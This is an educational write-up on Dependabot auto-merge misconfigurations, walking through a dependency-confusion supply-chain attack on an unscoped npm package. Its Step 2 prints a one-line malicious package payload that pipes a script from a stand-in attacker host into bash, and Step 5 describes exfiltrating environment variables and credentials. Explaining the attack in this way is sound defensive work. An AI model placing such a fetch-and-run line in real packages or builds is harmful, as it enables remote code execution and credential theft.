What is Dependabot?
- Dependabot is a GitHub feature that automatically creates pull requests (PRs) to update dependencies in your project.
- It helps keep libraries and packages up to date, especially when security patches are released

## What is Auto-merge in Dependabot?
Auto-merge is a setting that allows PRs including those created by Dependabot to be automatically merged into the main branch once certain conditions are met (like passing tests or getting approvals).
Example:
- Dependabot detects a new version of lodash.
- It creates a PR to update package.json.
- Tests pass → the PR gets auto-merged without human review.

## Than what is the Misconfiguration?
A Dependabot Auto-merge Misconfiguration happens when:
- Auto-merge is enabled without strict controls (like branch protection, required reviews, or trusted sources)
- An attacker injects or poisons a dependency, and the workflow automatically merges the malicious update
- No human ever reviews the code and it lands directly into main
- It’s not about using Dependabot or auto-merge itself. It’s about enabling auto-merge for dependency updates without applying any guardrails, like:
	- Review requirements
	- Branch protection
	- Source verification
	- Trust boundaries

## The Core Problem:
You’re letting a machine (Dependabot) pull in and merge code into your main branch possibly from external, attacker-controlled sources without any human oversight.

## Auto-merging All Dependabot PRs Without Review
```yml
# .github/dependabot.yml
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    allow:
      - dependency-type: "all"
# Auto-merge is enabled elsewhere via repo settings or workflow.
```

Your `.github/dependabot.yml` config tells Dependabot to:
- Monitor npm dependencies in the root folder 
- Check for new updates daily
- Allow all types of updates (dev + prod)
- Keep at most 10 open update PRs
- Let another system (repo settings/workflow) handle auto-merging

## Allowing Updates to Core Files
- Dependabot updates:
    - action.yml
    - Dockerfile
    - .github/workflows/*
- These define how your pipeline works.
- If an attacker injects code via one of these, and it gets automerged? You now have CI/CD compromise.

## No Source Validation
- Your project uses an un-scoped dependency like:
```
"dependencies": { 
	"internal-lib": "^1.0.0" 
}
```
- But internal-lib isn't scoped (**@your-org/internal-lib**) so someone can publish a public malicious version
- Dependabot sees the:
- public one → suggests an update → auto-merge runs → supply chain attack

## Misconfiguration Summery
| Misconfig                                     | Why It’s Dangerous                                             |
| --------------------------------------------- | -------------------------------------------------------------- |
| Auto-merge with no required PR reviews        | Merges attacker-controlled changes without oversight           |
| No branch protection rules on main            | Allows PRs to directly update production code                  |
| Use of unscoped packages                      | Opens the door to dependency confusion                         |
| Allowing auto-merge for GitHub Actions/Docker | Runs attacker-modified logic in CI pipelines                   |
| Ignoring lockfiles or checksums               | Permits version swapping in transit or via poisoned registries |

## Attack
### Step 1 - Exploitation Scenario
- Identify unscoped internal dependency
- Attacker sees:
```
"dependencies": { 
	"internal-lib": "^1.0.0" 
}
```
- That’s a red flag: there’s no scope like *@company/internal-lib*

### Step 2 – Exploitation Scenario
- Register and publish malicious package
- Attacker publishes a public package called internal-lib to npmjs.com:

```
// index.js 
require('child_process').execSync('curl https://attacker.site/payload.sh | bash');
```
- This package appears legitimate and has version *1.1.0*.

### Step 3 – Exploitation Scenario
- Dependabot triggers update
- Dependabot notices a newer version (1.1.0) of internal-lib is available and creates a PR to update it
```
- "internal-lib": "^1.0.0" 
+ "internal-lib": "^1.1.0"
```
### Step 4 – Exploitation Scenario
- Auto-merge kicks in, why? Because:
    - Tests pass
    - Branch protection rules don’t require manual review
    - Auto-merge is enabled for Dependabot
    - The PR is automatically merged into main.

### Step 5 – Exploitation Scenario
- Malicious code is now in the app
- Your app runs this new dependency on next build/deploy
- The malicious postinstall script or code gets executed:
    - Exfiltrates environment variables
    - Installs backdoors
    - Leverages build agent tokens (e.g., AWS credentials)